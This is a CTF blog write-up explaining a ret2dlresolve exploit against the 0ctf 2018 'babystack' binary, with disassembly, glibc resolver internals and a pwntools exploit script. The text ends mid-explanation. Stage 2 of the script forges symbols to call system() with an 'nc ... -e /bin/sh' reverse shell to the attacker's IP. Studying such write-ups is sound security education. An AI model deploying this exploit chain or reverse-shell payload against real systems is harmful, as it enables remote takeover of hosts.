@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>0ctf 2018 quals - babystack | kileak</title>
+
+
+
+
+
+<meta name="description" content="0ctf 2018 quals - babystack">
+
+
+<meta name="keywords" content="0ctf">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/0ctf-qual-babystack/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">0ctf 2018 quals - babystack</h1>
+      <p class="post-meta">Apr 2, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>0ctf 2018 quals - babystack (ret2dlresolve)
+<!--break--></p>
+
+  <p>Info leak is no longer required to exploit a stack overflow in 2018.</p>
+
+  <p>Enjoy the babystack</p>
+
+  <p>202.120.7.202:6666
+Attachment: <a href="https://kileak.github.io/assets/babystack/babystack">babystack</a> <a href="https://kileak.github.io/assets/babystack/pow.py">pow.py</a> <a href="https://kileak.github.io/assets/babystack/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<p>The challenge was originally solved by <code class="language-plaintext highlighter-rouge">vakzz</code> in the ctf. I just tried it also afterwards and made the writeup to have some notes on <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<p>Ok, there’s not much in the binary to work with. All it does, is setting up a timeout and then call a function with an obvious buffer overflow.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> 
+
+  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Thus, the binary only has got entries for <code class="language-plaintext highlighter-rouge">alarm</code> and <code class="language-plaintext highlighter-rouge">read</code>, no easy way to print anything. And even if we could write something, the calling python script would pipe it to <code class="language-plaintext highlighter-rouge">/dev/null</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python -u
+# encoding: utf-8
+</span>
+<span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
+
+<span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">)))</span>
+
+<span class="k">def</span> <span class="nf">proof_of_work</span><span class="p">():</span>
+    <span class="n">chal</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">letters</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+    <span class="k">print</span> <span class="n">chal</span>
+    <span class="n">sol</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">sha256</span><span class="p">(</span><span class="n">chal</span> <span class="o">+</span> <span class="n">sol</span><span class="p">).</span><span class="n">digest</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">'</span><span class="se">\0\0\0</span><span class="s">'</span><span class="p">):</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">exec_serv</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="nb">file</span><span class="p">(</span><span class="s">'/dev/null'</span><span class="p">,</span><span class="s">'w'</span><span class="p">),</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">proof_of_work</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+    <span class="n">exec_serv</span><span class="p">(</span><span class="s">'./babystack'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>This script is used on the server, to read the proof of work and then start the binary.</p>
+
+<p>It will read <code class="language-plaintext highlighter-rouge">0x100</code> bytes once and then pass them to the binary, so we cannot do multiple sends and have to send our complete payload in one go (might render your exploit unusable, if you developed it against the binary directly). So we have to forge our payload carefully, doing exact reads, when passing additional data in our payload.</p>
+
+<ul>
+  <li>No output, so no leaks possible</li>
+  <li>No libc provided, so no offset calculation possible</li>
+</ul>
+
+<p>Obviously, they’re asking for <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>. Won’t be doing a complete walkthrough on how to setup the different tables needed for <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>, since there are already many writeups out there, which go into more detail.</p>
+
+<p>This writeup serves more as a reminder for my future me ;)</p>
+
+<p>Other writeups on <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>:</p>
+
+<ul>
+  <li><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/">ROP之return to dl-resolve</a></li>
+  <li><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">Return-to-dl-resolve</a></li>
+  <li><a href="http://inaz2.hatenablog.com/entry/2014/07/27/205322">Return-to-dl-resolve on x64</a></li>
+</ul>
+
+<p>When a binary tries to call a function from libc for the first time, it has to resolve the real address of the function in libc first.</p>
+
+<p>At startup the <code class="language-plaintext highlighter-rouge">got</code> entries in the binary contains the address of the corresponding <code class="language-plaintext highlighter-rouge">plt</code> function:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x804a000:  0x08049f14  0xf7ffd940  0xf7fead80  0x08048306  &lt;= _dl_runtime_resolve / read.got
+0x804a010:  0x08048316  0xf7dcdd90  0x00000000  0x00000000  &lt;= alarm.got
+
+gdb-peda$ x/2i 0x08048306
+   0x8048306 &lt;read@plt+6&gt;:  push   0x0
+   0x804830b &lt;read@plt+11&gt;: jmp    0x80482f0
+
+gdb-peda$ x/2i 0x08048316
+   0x8048316 &lt;alarm@plt+6&gt;: push   0x8
+   0x804831b &lt;alarm@plt+11&gt;:  jmp    0x80482f0
+
+gdb-peda$ x/2i 0x80482f0
+   0x80482f0: push   DWORD PTR ds:0x804a004    &lt;= link_map
+   0x80482f6: jmp    DWORD PTR ds:0x804a008    &lt;= 0xf7fead80 (_dl_runtime_resolve)
+
+gdb-peda$ x/10i 0xf7fead80
+   0xf7fead80 &lt;_dl_runtime_resolve&gt;:  push   eax
+   0xf7fead81 &lt;_dl_runtime_resolve+1&gt;:  push   ecx
+   0xf7fead82 &lt;_dl_runtime_resolve+2&gt;:  push   edx
+   0xf7fead83 &lt;_dl_runtime_resolve+3&gt;:  mov    edx,DWORD PTR [esp+0x10]
+   0xf7fead87 &lt;_dl_runtime_resolve+7&gt;:  mov    eax,DWORD PTR [esp+0xc]
+   0xf7fead8b &lt;_dl_runtime_resolve+11&gt;: call   0xf7fe4f30 &lt;_dl_fixup&gt;
+   0xf7fead90 &lt;_dl_runtime_resolve+16&gt;: pop    edx
+   0xf7fead91 &lt;_dl_runtime_resolve+17&gt;: mov    ecx,DWORD PTR [esp]
+   0xf7fead94 &lt;_dl_runtime_resolve+20&gt;: mov    DWORD PTR [esp],eax
+   0xf7fead97 &lt;_dl_runtime_resolve+23&gt;: mov    eax,DWORD PTR [esp+0x4]</code></pre></figure>
+
+<p>In the binary itself, whenever it wants to call <code class="language-plaintext highlighter-rouge">read</code> for example, it will call <code class="language-plaintext highlighter-rouge">read.plt</code></p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">gdb-peda$ x/10i 0x804843b
+   0x804843b: push   ebp
+   0x804843c: mov    ebp,esp
+   0x804843e: sub    esp,0x28
+   0x8048441: sub    esp,0x4
+   0x8048444: push   0x40
+   0x8048446: lea    eax,[ebp-0x28]
+   0x8048449: push   eax
+   0x804844a: push   0x0
+   0x804844c: call   0x8048300 &lt;read@plt&gt;
+   0x8048451: add    esp,0x10
+
+gdb-peda$ x/3i 0x8048300
+   0x8048300 &lt;read@plt&gt;:  jmp    DWORD PTR ds:0x804a00c
+   0x8048306 &lt;read@plt+6&gt;:  push   0x0
+   0x804830b &lt;read@plt+11&gt;: jmp    0x80482f0</code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">read@plt</code> function will jump to the address stored at <code class="language-plaintext highlighter-rouge">0x804a00c</code>, which points to <code class="language-plaintext highlighter-rouge">0x8048306</code> at <em>program startup</em>. This is basically <code class="language-plaintext highlighter-rouge">read@plt+6</code>, which will then push a <code class="language-plaintext highlighter-rouge">0x0</code> (offset for <code class="language-plaintext highlighter-rouge">read</code> symbol) to the stack and jump to <code class="language-plaintext highlighter-rouge">0x80482f0</code>, which then pushes <code class="language-plaintext highlighter-rouge">0x804a004</code> (link_map) to the stack and call the function stored in address <code class="language-plaintext highlighter-rouge">0x804a008</code> (which points to <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code>).</p>
+
+<p><code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code> will now lookup the correct address of <code class="language-plaintext highlighter-rouge">read</code> in libc, store it in the got entry (<code class="language-plaintext highlighter-rouge">0x804a00c</code>) and call it. Though, when read is now called another time, <code class="language-plaintext highlighter-rouge">read@plt</code> will again try to jump to the address stored at <code class="language-plaintext highlighter-rouge">0x804a00c</code>. But this time, since the linker already stored the resolved address there, it will directly jump to <code class="language-plaintext highlighter-rouge">read</code> in libc.</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">.text
+  .globl _dl_runtime_resolve
+  .type _dl_runtime_resolve, @function
+  cfi_startproc
+  .align 16
+_dl_runtime_resolve:
+  cfi_adjust_cfa_offset (8)
+  pushl %eax    # Preserve registers otherwise clobbered.
+  cfi_adjust_cfa_offset (4)
+  pushl %ecx
+  cfi_adjust_cfa_offset (4)
+  pushl %edx
+  cfi_adjust_cfa_offset (4)
+  movl 16(%esp), %edx # Copy args pushed by PLT in register.  Note
+  movl 12(%esp), %eax # that `fixup' takes its parameters in regs.
+  call _dl_fixup    # Call resolver.
+  popl %edx   # Get register content back.
+  cfi_adjust_cfa_offset (-4)
+  movl (%esp), %ecx
+  movl %eax, (%esp) # Store the function address.
+  movl 4(%esp), %eax
+  ret $12     # Jump to function address.
+  cfi_endproc
+  .size _dl_runtime_resolve, .-_dl_runtime_resolve</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code> will call <code class="language-plaintext highlighter-rouge">_dl_fixup</code> to resolve the address of the function in libc.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">_dl_fixup</span> <span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="k">const</span> <span class="n">symtab</span>
+    <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_SYMTAB</span><span class="p">]);</span>
+  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span>
+
+  <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span>
+    <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
+  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
+  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">refsym</span> <span class="o">=</span> <span class="n">sym</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="k">const</span> <span class="n">rel_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_offset</span><span class="p">);</span>
+  <span class="n">lookup_t</span> <span class="n">result</span><span class="p">;</span>
+  
+  <span class="p">...</span>
+  
+      <span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span>
+            <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">_dl_fixup</code> gets a pointer to the <code class="language-plaintext highlighter-rouge">link_map</code> and a <code class="language-plaintext highlighter-rouge">reloc_arg</code>, which defines where to look in the symbol table for the name of the symbol.</p>
+
+<p>If we’re able to create a fake symtab and call <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code> with the offset to our fake symbol, <code class="language-plaintext highlighter-rouge">_dl_fixup</code> will happily resolve our symbol and call it. Refer to the already mentioned writeups for more detail on creating fake symtab and strtabs. For now, we’ll be using <code class="language-plaintext highlighter-rouge">roputils</code> to do the calculations and forge those.</p>
+
+<p>For the start, <code class="language-plaintext highlighter-rouge">babystack</code> reads 64 bytes input, and the overflow into <code class="language-plaintext highlighter-rouge">ebp</code> happens after byte 40. That means, we have 24 bytes for our payload, which is not quite enough for what we need, so we start with forcing it to read another payload enlarging our ropchain.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">roputils</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">string</span><span class="p">,</span> <span class="n">itertools</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"202.120.7.202"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">6666</span>
+
+<span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">letters</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span>
+
+<span class="k">def</span> <span class="nf">calcpow</span><span class="p">(</span><span class="n">chal</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">combo</span> <span class="ow">in</span> <span class="n">itertools</span><span class="p">.</span><span class="n">combinations_with_replacement</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">letters</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span>
+        <span class="n">sol</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">combo</span><span class="p">)</span>        
+        <span class="k">if</span> <span class="n">sha256</span><span class="p">(</span><span class="n">chal</span> <span class="o">+</span> <span class="n">sol</span><span class="p">).</span><span class="n">digest</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">"</span><span class="se">\0\0\0</span><span class="s">"</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">sol</span>
+
+    <span class="k">return</span> <span class="bp">None</span>
+
+<span class="k">def</span> <span class="nf">get_connection</span><span class="p">():</span>
+    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">)</span> <span class="k">if</span> <span class="n">LOCAL</span> <span class="k">else</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Solve pow "</span><span class="p">)</span>
+
+    <span class="n">sol</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">while</span> <span class="n">sol</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">get_connection</span><span class="p">()</span>
+
+        <span class="n">sol</span> <span class="o">=</span> <span class="n">calcpow</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">())</span>
+
+        <span class="k">if</span> <span class="n">sol</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>            
+
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span>
+
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stage1: Prepare bigger read for ropchain"</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804a500</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048446</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">80</span><span class="p">)</span>                 <span class="c1"># exact length of stage 2 payload
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="p">(</span><span class="mi">64</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    
+    <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./babystack"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>        
+        <span class="n">exploit</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>                        
+        <span class="n">exploit</span><span class="p">()</span></code></pre></figure>
+
+<p>This will read another ropchain at <code class="language-plaintext highlighter-rouge">0x804a4d8</code> (<code class="language-plaintext highlighter-rouge">ebp-0x28</code>), so we know exactly where our next string will be stored (partially defeating ASLR).</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">gdb-peda$ x/10i 0x8048446
+   0x8048446: lea    eax,[ebp-0x28]
+   0x8048449: push   eax
+   0x804844a: push   0x0
+   0x804844c: call   0x8048300 &lt;read@plt&gt;
+   0x8048451: add    esp,0x10
+   0x8048454: nop
+   0x8048455: leave  
+   0x8048456: ret    </code></pre></figure>
+
+<p>The following <code class="language-plaintext highlighter-rouge">leave; ret</code> will pivot the stack to our payload, executing the next ropchain, we’ll store there.</p>
+
+<p>In the next step, we’ll do another <code class="language-plaintext highlighter-rouge">read</code>, which will read our fake symbol onto <code class="language-plaintext highlighter-rouge">bss</code> and then creates a call to <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code> with the offset to our fake symbol.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Stage2: Send ret2dlresolve executing reverse shell"</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804a500</span><span class="p">)</span>
+
+<span class="c1"># Read the fake tabs from payload2 to bss
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">"read"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr_bss</span><span class="p">,</span> <span class="mi">150</span><span class="p">)</span>
+
+<span class="c1"># Call dl_resolve with offset to our fake symbol
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="n">dl_resolve_call</span><span class="p">(</span><span class="n">addr_bss</span><span class="o">+</span><span class="mi">60</span><span class="p">,</span> <span class="n">addr_bss</span><span class="p">)</span>
+
+<span class="c1"># Create fake rel and sym on bss
+</span><span class="n">payload2</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">string</span><span class="p">(</span><span class="s">"nc %s 7777 -e /bin/sh"</span> <span class="o">%</span> <span class="n">LOCALIP</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>                        <span class="c1"># Align symbol to bss+60
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="n">dl_resolve_data</span><span class="p">(</span><span class="n">addr_bss</span><span class="o">+</span><span class="mi">60</span><span class="p">,</span> <span class="s">"system"</span><span class="p">)</span>    <span class="c1"># Fake r_info / st_name
+</span><span class="n">payload2</span> <span class="o">+=</span> <span class="n">rop</span><span class="p">.</span><span class="n">fill</span><span class="p">(</span><span class="mi">150</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
+    
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">payload2</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">dl_resolve_call</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
+        <span class="n">jmprel</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'JMPREL'</span><span class="p">)</span>
+        <span class="n">relent</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">dynamic</span><span class="p">(</span><span class="s">'RELENT'</span><span class="p">)</span>
+
+        <span class="n">addr_reloc</span><span class="p">,</span> <span class="n">padlen_reloc</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">align</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">jmprel</span><span class="p">,</span> <span class="n">relent</span><span class="p">)</span>
+        <span class="n">reloc_offset</span> <span class="o">=</span> <span class="n">addr_reloc</span> <span class="o">-</span> <span class="n">jmprel</span>
+
+        <span class="n">buf</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">plt</span><span class="p">())</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">gadget</span><span class="p">(</span><span class="s">'pop'</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">args</span><span class="p">)))</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">buf</span></code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">dl_resolve_call</code> will calculate the offset for our fake symbol and put the address of the plt function to the stack, which will then basically call</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">gdb-peda$ x/2i 0x80482f0
+   0x80482f0: push   DWORD PTR ds:0x804a004    &lt;= link_map
